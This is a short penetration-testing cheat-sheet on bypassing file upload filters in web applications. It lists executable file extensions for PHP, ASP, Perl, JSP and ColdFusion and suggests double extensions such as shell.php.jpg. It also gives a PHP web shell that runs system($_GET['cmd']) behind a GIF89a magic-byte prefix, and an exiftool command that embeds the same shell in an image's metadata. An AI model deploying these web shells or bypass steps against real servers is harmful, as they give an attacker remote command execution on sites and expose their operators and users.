# Bypass File Upload Filtering

## Rename it

We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.

**php**
phtml, .php, .php3, .php4, .php5, and .inc

**asp**
asp, .aspx

**perl**
.pl, .pm, .cgi, .lib

**jsp**
.jsp, .jspx, .jsw, .jsv, and .jspf

**Coldfusion**
.cfm, .cfml, .cfc, .dbm

## GIF89a;
If they check the content.
Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

```
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

## In image
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```

Exiftool is a great tool to view and manipulate exif-data.
Then I had to rename the file

mv lo.jpg lo.php.jpg
